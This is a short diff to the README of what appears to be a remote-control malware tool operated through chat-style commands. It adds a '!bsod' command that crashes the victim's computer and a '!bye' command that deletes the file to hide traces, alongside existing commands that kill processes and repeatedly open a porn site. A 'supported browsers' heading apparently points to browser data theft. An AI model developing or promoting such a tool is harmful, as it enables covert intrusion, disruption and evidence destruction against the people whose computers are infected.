@@ -50,6 +50,8 @@ DOWNLOAD THE FILE AS A WHOLE ( AS A ZIP ). OPEN "getrequirements.bat", wait for 
 29. !goon -- Opens The Hub a lot of times
 30. !processes -- Lists all processes
 31. !kill ( pid ) -- Kills processes
+32. !bsod -- executes blue screen of death
+33. !bye -- deletes file off pc to hide traces
 
 # SUPPORTED BROWSERS 
 
